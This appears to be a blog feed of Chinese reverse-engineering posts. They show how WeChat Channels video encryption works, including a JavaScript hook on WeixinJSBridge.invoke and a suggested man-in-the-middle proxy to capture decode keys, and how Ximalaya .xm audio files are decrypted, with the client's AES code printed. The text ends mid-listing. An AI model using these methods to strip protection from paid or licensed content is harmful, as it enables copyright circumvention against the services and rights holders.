<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_024332.png" alt="Screenshot_20231130_024332"></p>
<p>经过研究，我们了解到Isaac64实际上是一个随机数生成算法。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_024924.png" alt="Screenshot_20231130_024924"></p>
<p>因此，我们可以合理推测：</p>
<ol>
<li>decryptor使用视频对应的seed进行初始化。</li>
<li>JavaScript调用<code>decryptor.generate()</code>，指示wasm在其内存中生成2^17即131072个随机数。</li>
<li>wasm生成随机数后，通过<code>wasm_isaac_generate</code>将这些随机数写回JavaScript，赋值给<code>decryptor_array</code>。</li>
</ol>
<p>现在，我们知道了<code>decryptor_array</code>的来源，接下来的问题是确定初始化Isaac64算法的seed的来源。</p>
<h2 id="Tracebackbackbackbackback"><a href="#Tracebackbackbackbackback" class="headerlink" title="Tracebackbackbackbackback"></a>Tracebackbackbackbackback</h2><p>接下来就是不停的打断点，看call stack， 直到找到<code>seed</code>最早出现的地方就行了。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_030303.png" alt="Screenshot_20231130_030303"></p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_030340.png" alt="Screenshot_20231130_030340"></p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_030849.png" alt="Screenshot_20231130_030849"></p>
<p>简单来说呢就是顺序就是从<code>FinderGetCommentDetail(objectid)</code>-&gt;<code>objectDesc.media.decodeKey-</code>&gt;<code>seed</code>。</p>
<h2 id="注入WeixinJSBridge"><a href="#注入WeixinJSBridge" class="headerlink" title="注入WeixinJSBridge"></a>注入WeixinJSBridge</h2><p>那么<code>FinderGetCommentDetail</code>又是通过什么获取到信息的呢。继续追踪调用。可以发现<code>FinderGetCommentDetail</code>最后使用了<code>window.WeixinJSBridge.invoke</code>来获取数据。</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_031821.png" alt="Screenshot_20231130_031821"></p>
<p><code>window.WeixinJSBridge</code> ？？？那接下來就要逆向微信的通信协议了。我才懒得逆向这玩意。</p>
<p>立刻启动后备隐藏能源，发动注入模式</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">wrapper</span>(<span class="params">name,origin</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`injecting <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> cmdName = <span class="variable language_">arguments</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;name&#125;</span>(&quot;<span class="subst">$&#123;cmdName&#125;</span>&quot;, ...) =&gt; args: `</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> original_callback = <span class="variable language_">arguments</span>[<span class="number">2</span>];</span><br><span class="line">                <span class="variable language_">arguments</span>[<span class="number">2</span>] = <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;name&#125;</span>(&quot;<span class="subst">$&#123;cmdName&#125;</span>&quot;, ...) =&gt; callback result (length: <span class="subst">$&#123;<span class="variable language_">arguments</span>.length&#125;</span>):`</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">await</span> original_callback.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> result = origin.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">WeixinJSBridge</span>.<span class="property">invoke</span> = <span class="title function_">wrapper</span>(<span class="string">&quot;WeixinJSBridge.invoke&quot;</span>,<span class="variable language_">window</span>.<span class="property">WeixinJSBridge</span>.<span class="property">invoke</span>);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
<p>总之结果很好，获得了需要的所有数据</p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_010450.png" alt="Screenshot_20231130_010450"></p>
<p><img data-src="/images/wechat-video-encryption-reverse-engineer/Screenshot_20231130_010436.png" alt="Screenshot_20231130_010436"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>通过<code>FinderGetCommentDetail</code>获取到视频的<code>decode_key</code>(就是<code>seed</code>)，<code>url</code>，<code>title</code>等信息</li>
<li>通过seed生成<code>decryptor_array</code></li>
<li>通过url下载加密后的视频文件，把视频的加密段数据和<code>decryptor_array</code>做异或运算即可。</li>
</ol>
<h1 id="如何实现一个视频下载器"><a href="#如何实现一个视频下载器" class="headerlink" title="如何实现一个视频下载器"></a>如何实现一个视频下载器</h1><p>由于获取<code>seed</code>需要逆向微信协议，我不想在逆向这个协议上花费太多时间。</p>
<p>既然WechatVideoDownloader已经使用代理获取视频地址，我们可以进一步使用中间人攻击来获取视频链接及对应的<code>decode_key</code>。</p>
<p>只需将注入<code>WeixinJSBridge.invoke</code>的代码插入到某个JS文件中，当微信客户端请求视频链接时，就把获取到的视频链接发送到本地服务器。</p>
<p>这样不仅解决了seed和链接的问题，连视频标题也能获取到。</p>
<p>最后，下载完视频后，通过seed生成解密序列并对视频进行解密。</p>
<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>回顾这次的逆向工程过程，我们可以看到WebAssembly在现代网络安全和逆向工程领域扮演着越来越重要的角色。随着WebAssembly的普及，JavaScript逆向逐渐演变为WebAssembly逆向。这不仅提高了代码的执行效率，同时也给逆向工程带来了更多的挑战和机遇。</p>
<h1 id="Relevant-Links"><a href="#Relevant-Links" class="headerlink" title="Relevant Links"></a>Relevant Links</h1><ol>
<li>微信 v3.9.8.15</li>
<li><a href="https://aladin.wxqcloud.qq.com/aladin/ffmepeg/video-decode/1.2.46/wasm_video_decode.wasm">wasm_video_decode.wasm v1.2.46</a></li>
<li><a href="https://aladin.wxqcloud.qq.com/aladin/ffmepeg/video-decode/1.2.46/worker_release.js">worker_release.js v1.2.46</a></li>
<li><a href="https://aladin.wxqcloud.qq.com/aladin/ffmepeg/video-decode/1.2.46/wasm_video_decode.js">wasm_video_decode.js v1.2.46</a></li>
<li><a href="https://aladin.wxqcloud.qq.com/aladin/ffmepeg/video-decode/1.2.46/wasm_video_decode_fallback.js">wasm_video_decode_fallback.js v1.2.46</a></li>
</ol>
<h1 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h1><p>本博客中提供的信息和过程仅供学习和研究目的使用。博主不鼓励、不支持并强烈反对任何形式的非法行为，包括但不限于未经授权的数据访问、破解或逆向工程。博客内容的使用应遵守相关法律法规以及道德规范。</p>
<p>读者在使用本博客中的信息时，应自行承担相应的风险和责任。博主不对由于使用、引用或依赖本博客中信息而产生的任何形式的损害或损失负责。此外，博主对于博客内容的准确性、完整性或适用性不作任何明示或暗示的保证。</p>
<p>请读者在使用本博客中的技术和信息时，始终保持合法、负责任的态度，尊重知识产权和隐私权。如果您不确定您的行为是否合法，或者您的行为可能会侵犯他人的权利，请在行动前咨询专业法律意见。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>reverse</tag>
        <tag>encryption</tag>
        <tag>webassembly</tag>
      </tags>
  </entry>
  <entry>
    <title>why pixilation a text is bad</title>
    <url>/articles/ctf/why-pixilation-is-bad/</url>
    <content><![CDATA[<p>todo.</p>
<p>check out <a href="https://bishopfox.com/blog/unredacter-tool-never-pixelation">https://bishopfox.com/blog/unredacter-tool-never-pixelation</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>喜马拉雅xm文件解密逆向分析 [Electron]</title>
    <url>/articles/ctf/xi-ma-la-ya-xm-wen-jian-jie-mi-ni-xiang-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>说点前言，但是我又不知道说啥了。</p>
<p>由于最近突然喜欢在做事情的时候开个有声小说，于是我就把喜马拉雅这个软件重新下载了下来，并小冲了一个会员。</p>
<p>我注意到喜马拉雅这个客户端同时具有下载的功能，小小的尝试了一下，发现下载下来的文件为<code>.xm</code>文件格式。这个格式属于一种加密的格式，除了喜马拉雅客户端之外都不能播放。</p>
<p>什么，加密的？这怎么能忍。</p>
<p><strong>仅限于学习交流使用，本文作者不负任何其他责任</strong></p>
<p><strong>Disclaimer: Only used for educational purpose.</strong></p>
<span id="more"></span>

<h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>Electron自带的参数可以很好的帮助我们对electron程序进行动态分析。</p>
<p>electron在运行的时候一般会有两个process。一个为main process，另外一个为render process</p>
<p>在调试这个程序的时候，主要需要调试的main process。 所以我们可以加上<code>--enable-logging</code>来显示main process中<code>console.log</code>的内容。</p>
<p>同时，我们也可以用<code>--inspect=9000</code> + chrome v8 debugger 的方式进行调试。</p>
<p><em>在使用inspect的时候需要给<code>main.prod.js</code>加上一个patch，不然启动不了</em><br><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-16_022033.png" alt="2023-03-16_022033.png"></p>
<p>如果我们需要对 render process 进行调试，我们可以在代码中加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const &#123; BrowserWindow &#125; = require(&#x27;electron&#x27;)</span><br><span class="line"></span><br><span class="line">const win = new BrowserWindow()</span><br><span class="line">win.webContents.openDevTools()</span><br></pre></td></tr></table></figure>

<p>并重新打包<code>app.asar</code>。</p>
<p>当然，喜马拉雅app提供了另外一个flag <code>--xmdebugger</code>来启动render process的debugger</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-16_021727.png" alt="2023-03-16_021727.png"></p>
<blockquote>
<p>具体可以看 Reference Section</p>
</blockquote>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>首先来看一眼文件结构，ok，一眼electron，直接解压app.asar开破。</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-15_230658.png" alt="img"></p>
<p><code>app.asar</code> 在 <code>resourses</code> 目录下，解压之后发现了一堆文件。</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-15_231056.png" alt="2023-03-15_231056.png"></p>
<p>总之在经过一番寻找之后，我定位到了几个和解密加密有关的重要javascript文件。</p>
<p><code>24.chunk.js</code> 以及 <code>updater.chunk.js</code>。(和加密解密完全无关的名字，这就是混淆么)</p>
<p>首先我们用<code>js-beautify</code>来格式化代码，不然代码在都在一行里分析起来太折磨了。</p>
<blockquote>
<p>关于<code>js-beautify</code>的安装使用可以参考<a href="https://github.com/beautify-web/js-beautify">js-beautify</a></p>
</blockquote>
<h2 id="updater-chunk-js"><a href="#updater-chunk-js" class="headerlink" title="updater.chunk.js"></a>updater.chunk.js</h2><details>
<summary>updater.chunk.js</summary>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">n.<span class="title function_">e</span>(<span class="number">24</span>).<span class="title function_">then</span>(n.<span class="title function_">bind</span>(<span class="literal">null</span>, <span class="number">1297</span>)).<span class="title function_">then</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">xmDecrypt</span> = e.<span class="property">ext_xm_decode</span>, <span class="variable language_">window</span>.<span class="property">xmEncrypt</span> = e.<span class="property">ext_xm_encode</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">N</span> <span class="keyword">extends</span> <span class="title class_ inherited__">u.WriteStream</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(e), <span class="title function_">C</span>(<span class="variable language_">this</span>, <span class="string">&quot;tags&quot;</span>, <span class="keyword">void</span> <span class="number">0</span>), <span class="title function_">C</span>(<span class="variable language_">this</span>, <span class="string">&quot;info&quot;</span>, <span class="keyword">void</span> <span class="number">0</span>), <span class="title function_">C</span>(<span class="variable language_">this</span>, <span class="string">&quot;iv&quot;</span>, <span class="keyword">void</span> <span class="number">0</span>), <span class="title function_">C</span>(<span class="variable language_">this</span>, <span class="string">&quot;chunkCount&quot;</span>, <span class="keyword">void</span> <span class="number">0</span>), <span class="variable language_">this</span>.<span class="property">tags</span> = n, <span class="variable language_">this</span>.<span class="property">info</span> = t;</span><br><span class="line">            <span class="keyword">const</span> o = <span class="variable language_">this</span>.<span class="property">tags</span>.<span class="property">ISRC</span> || <span class="variable language_">this</span>.<span class="property">tags</span>.<span class="property">encodedBy</span> || <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">iv</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(o, <span class="string">&quot;hex&quot;</span>), <span class="variable language_">this</span>.<span class="property">chunkCount</span> = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加密函数</span></span><br><span class="line">    <span class="title function_">write</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> n = e;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">chunkCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">             <span class="keyword">const</span> r = e.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">12</span>).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>),</span><br><span class="line">                o = e.<span class="title function_">slice</span>(<span class="number">12</span>).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;restChunk&quot;</span>, o, o.<span class="property">length</span>, <span class="variable language_">this</span>.<span class="property">info</span>.<span class="property">trackId</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">time</span>(<span class="string">&quot;加密耗时:&quot;</span>);</span><br><span class="line">                <span class="keyword">const</span> e = <span class="variable language_">window</span>.<span class="title function_">xmEncrypt</span>(o, <span class="string">&quot;&quot;</span> + <span class="variable language_">this</span>.<span class="property">info</span>.<span class="property">trackId</span>);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">timeEnd</span>(<span class="string">&quot;加密耗时:&quot;</span>), e || <span class="title function_">t</span>(<span class="string">&quot;下载遇到了问题，保存失败&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[nodeEncrypt] trackId:<span class="subst">$&#123;<span class="variable language_">this</span>.info.trackId&#125;</span>, iv: <span class="subst">$&#123;<span class="variable language_">this</span>.iv.toString(<span class="string">&quot;hex&quot;</span>)&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">const</span> a = <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">                    <span class="keyword">const</span> n = m.<span class="property">a</span>.<span class="title function_">createCipheriv</span>(<span class="string">&quot;aes-256-cbc&quot;</span>, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(j), t);</span><br><span class="line">                                <span class="keyword">let</span> r = n.<span class="title function_">update</span>(e);</span><br><span class="line">                                <span class="keyword">return</span> r = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([r, n.<span class="title function_">final</span>()]), r</span><br><span class="line">                    &#125;(e, <span class="variable language_">this</span>.<span class="property">iv</span>),</span><br><span class="line">                    i = a.<span class="property">length</span>,</span><br><span class="line">                    s = &#123;</span><br><span class="line">                        ...<span class="variable language_">this</span>.<span class="property">tags</span>,</span><br><span class="line">                        <span class="attr">encodingTechnology</span>: r,</span><br><span class="line">                        <span class="attr">size</span>: i</span><br><span class="line">                    &#125;,</span><br><span class="line">                    l = I.<span class="property">a</span>.<span class="title function_">create</span>(s);</span><br><span class="line">                n = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([l, a])</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;handle audio buffer error: &quot;</span>, e), e</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">chunkCount</span>++, <span class="variable language_">super</span>.<span class="title function_">write</span>(n, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="comment">// ignored</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">U</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">    t = t.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">const</span> n = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">16</span>, t.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">let</span> r = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> o = m.<span class="property">a</span>.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-192-cbc&quot;</span>, <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">24</span>, t), n);</span><br><span class="line">    <span class="keyword">return</span> r += o.<span class="title function_">update</span>(e, <span class="string">&quot;base64&quot;</span>), r += o.<span class="title function_">final</span>(), r</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> L = <span class="title function_">n</span>(<span class="number">234</span>);</span><br><span class="line"><span class="comment">// 解密函数</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">Q</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">e</span> = (<span class="params">e, &#123;</span></span><br><span class="line"><span class="params">        filePath: t,</span></span><br><span class="line"><span class="params">        trackId: n,</span></span><br><span class="line"><span class="params">        decryptVersion: r</span></span><br><span class="line"><span class="params">    &#125;</span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// console.log(`[nodeDecrypt] trackId: $&#123;n&#125;, decryptVersion:$&#123;r&#125;`);</span></span><br><span class="line">            <span class="comment">// NODEID3</span></span><br><span class="line">            <span class="keyword">const</span> o = f.<span class="property">a</span>.<span class="title function_">readFileSync</span>(t),</span><br><span class="line">                a = I.<span class="property">a</span>.<span class="title function_">getTagsFromBuffer</span>(o);</span><br><span class="line">            <span class="keyword">if</span> (!a || n &amp;&amp; +a.<span class="property">trackNumber</span> !== n) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;incorrect track&quot;</span>);</span><br><span class="line">            <span class="comment">// console.log(a.title,a.size);</span></span><br><span class="line">            <span class="keyword">const</span> &#123;</span><br><span class="line">                <span class="attr">title</span>: s,</span><br><span class="line">                <span class="attr">artist</span>: l,</span><br><span class="line">                <span class="attr">subtitle</span>: c,</span><br><span class="line">                <span class="attr">length</span>: d,</span><br><span class="line">                <span class="attr">comment</span>: &#123;</span><br><span class="line">                    <span class="attr">language</span>: u,</span><br><span class="line">                    <span class="attr">text</span>: p</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">album</span>: h,</span><br><span class="line">                <span class="attr">trackNumber</span>: b,</span><br><span class="line">                <span class="attr">size</span>: g,</span><br><span class="line">                <span class="attr">encodingTechnology</span>: v,</span><br><span class="line">                <span class="attr">ISRC</span>: _,</span><br><span class="line">                <span class="attr">fileType</span>: y,</span><br><span class="line">                <span class="attr">encodedBy</span>: w,</span><br><span class="line">                <span class="attr">publisher</span>: k,</span><br><span class="line">                <span class="attr">composer</span>: x,</span><br><span class="line">                <span class="attr">mediaType</span>: S</span><br><span class="line">            &#125; = a;</span><br><span class="line">            n = +b;</span><br><span class="line">            <span class="keyword">const</span> E = I.<span class="property">a</span>.<span class="title function_">removeTagsFromBuffer</span>(o);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[nodeDecrypt] trackId: <span class="subst">$&#123;n&#125;</span>, iv:<span class="subst">$&#123;_||w&#125;</span>`</span>);</span><br><span class="line">            <span class="keyword">const</span> P = <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">                    <span class="keyword">const</span> n = e,</span><br><span class="line">                        r = m.<span class="property">a</span>.<span class="title function_">createDecipheriv</span>(<span class="string">&quot;aes-256-cbc&quot;</span>, <span class="title class_">Buffer</span>.<span class="title function_">from</span>(j), t);</span><br><span class="line">                    <span class="keyword">let</span> o = r.<span class="title function_">update</span>(n);</span><br><span class="line">                    <span class="keyword">return</span> o = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([o, r.<span class="title function_">final</span>()]), o</span><br><span class="line">                &#125;(E.<span class="title function_">slice</span>(<span class="number">0</span>, +g), <span class="title class_">Buffer</span>.<span class="title function_">from</span>(_ || w, <span class="string">&quot;hex&quot;</span>)).<span class="title function_">toString</span>(),</span><br><span class="line">                q = (<span class="string">&quot;12&quot;</span> == r ? U : <span class="variable language_">window</span>.<span class="property">xmDecrypt</span>)(P, <span class="string">&quot;&quot;</span> + n);</span><br><span class="line">            <span class="comment">// console.log(P);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(q);</span><br><span class="line">            <span class="comment">// console.log(`[nodeDecrypt] $&#123;&quot;12&quot; == r&#125;, $&#123;r&#125;`);</span></span><br><span class="line">            <span class="keyword">if</span> (!q) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;parse track error&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> C = v + q;</span><br><span class="line">            C = <span class="title class_">Buffer</span>.<span class="title function_">concat</span>([<span class="title class_">Buffer</span>.<span class="title function_">from</span>(C, <span class="string">&quot;base64&quot;</span>), E.<span class="title function_">slice</span>(g)]);</span><br><span class="line">            <span class="keyword">const</span> N = <span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="title class_">Object</span>(L.<span class="property">a</span>)(C)]),</span><br><span class="line">                O = &#123;</span><br><span class="line">                    <span class="attr">trackName</span>: s,</span><br><span class="line">                    <span class="attr">anchorName</span>: l,</span><br><span class="line">                    <span class="attr">albumId</span>: +c,</span><br><span class="line">                    <span class="attr">duration</span>: +d,</span><br><span class="line">                    <span class="attr">trackCoverPath</span>: p,</span><br><span class="line">                    <span class="attr">trackId</span>: n,</span><br><span class="line">                    <span class="attr">albumTitle</span>: h,</span><br><span class="line">                    <span class="attr">src</span>: <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(N),</span><br><span class="line">                    <span class="attr">isPaid</span>: <span class="string">&quot;paid&quot;</span> === y,</span><br><span class="line">                    <span class="attr">deviceId</span>: k,</span><br><span class="line">                    <span class="attr">type</span>: S || <span class="string">&quot;&quot;</span></span><br><span class="line">                &#125;;</span><br><span class="line">            i.<span class="property">ipcRenderer</span>.<span class="title function_">sendTo</span>(e.<span class="property">senderId</span>, <span class="string">&quot;reply-track-decrypt-message&quot;</span>, O)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;de audio error: &quot;</span>, t), i.<span class="property">ipcRenderer</span>.<span class="title function_">sendTo</span>(e.<span class="property">senderId</span>, <span class="string">&quot;reply-track-decrypt-error-message&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="property">ipcRenderer</span>.<span class="title function_">on</span>(<span class="string">&quot;track-decrypt-message&quot;</span>, e), <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        i.<span class="property">ipcRenderer</span>.<span class="title function_">removeListener</span>(<span class="string">&quot;track-decrypt-message&quot;</span>, e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</details>

<p>首先，从加密函数中可以看出，<code>xm</code>文件加密只加密了文件的第一个chunk，其余的chunk都是以明文储存的。</p>
<p>在解密函数也能看出这一点，在解密了以一个chunk的数据后，他直接把这个数据和接下来的数据<code>concat</code>在一起了，没有再做别的处理。</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-15_233527.png" alt="img"></p>
<p>再来看看解密函数，解密的过程本身十分好懂</p>
<p><img data-src="/images/ctf/ximalya-xm-file-reverse/2023-03-15_234216.png" alt="img"></p>
<p>我们可以大致把解密的过程分为四个stage</p>
<p><strong>Stage 0</strong>: 第一个stage就是读取<code>ID3</code>tag，来获取必要的信息。</p>
<p>通过<code>getTagsFromBuffer</code>和<code>removeTagsFromBuffer</code>这两个函数，我们可以推测出，喜马拉雅使用了<a href="https://github.com/Zazama/node-id3">node-id3</a>这个开源库来读取文件头的id3 tags。</p>
<p>同时，观察后面的代码，我们也能发现这个解密函数使用了以下tag的值对数据进行解密。</p>
<p><code>trackNumber</code>, <code>size</code>, <code>encodingTechnology</code>, <code>ISR</code>, <code>encodedBy</code></p>
<p>在读取tag之后，解密函数会把tag数据从原始数据中删除，只保留数据部分。</p>
<p><strong>Stage 1</strong>: aes-256-cbc。</p>
<p>首先通过id3 tag中的<code>size</code>值获得被加密的数据长度 (也就是第一个chunk的长度)。 用<code>slice</code>把这部分数据拿出来。</p>
<p>然后看<code>ISRC</code>和<code>encodedby</code>这两个值。获取其中不为空字符串的值。把这个值以16进制进行读取，可以获得一个byte array。</p>
<p>接下来就可以对这部分加密数据进行解密了，把这个byte array作为iv，加上一个固定的key，用<code>aes-256-cbc</code>解密这个数据，可以获取到一段base64编码的数据。</p>
<p>这个数据将作为第三个stage的数据，进行进一步解密。</p>
<p>完成stage 1的解密之后，这个解密函数会判断<code>decryptVersion</code>是多少。如果<code>decryptVersion</code>为<code>&quot;12&quot;</code>那么就使用<code>U</code>这个解密函数，不然则使用<code>window.xmDecrypt</code>这个解密函数。</p>
<p>根据我的试验，最新版中所有的<code>decryptVersion</code>都不等于<code>&quot;12&quot;</code>（可能会有例外，但我遇到的都不是<code>&quot;12&quot;</code>）。</p>
<p>在获得对应的函数之后，解密函数会把上一步中获得数据以及<code>tracknumber</code>作为两个字符串参数传入，进行进一步的处理。</p>
<p>那么<code>xmDecrypt</code>在哪里呢，我们需要看到<code>24.chunk.js</code></p>
<h2 id="24-chunk-js"><a href="#24-chunk-js" class="headerlink" title="24.chunk.js"></a>24.chunk.js</h2><details>
<summary>24.chunk.js</summary>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="variable language_">window</span>.<span class="property">webpackJsonp</span> = <span class="variable language_">window</span>.<span class="property">webpackJsonp</span> || []).<span class="title function_">push</span>([</span><br><span class="line">  [<span class="number">24</span>], &#123;</span><br><span class="line">    <span class="number">1295</span>: <span class="keyword">function</span>(<span class="params">n, t, e</span>) &#123;</span><br><span class="line">      <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line">      (<span class="keyword">function</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        e.<span class="title function_">d</span>(t, <span class="string">&quot;b&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> g</span><br><span class="line">        &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;a&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> p</span><br><span class="line">        &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;d&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> x</span><br><span class="line">        &#125;)), e.<span class="title function_">d</span>(t, <span class="string">&quot;c&quot;</span>, (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> v</span><br><span class="line">        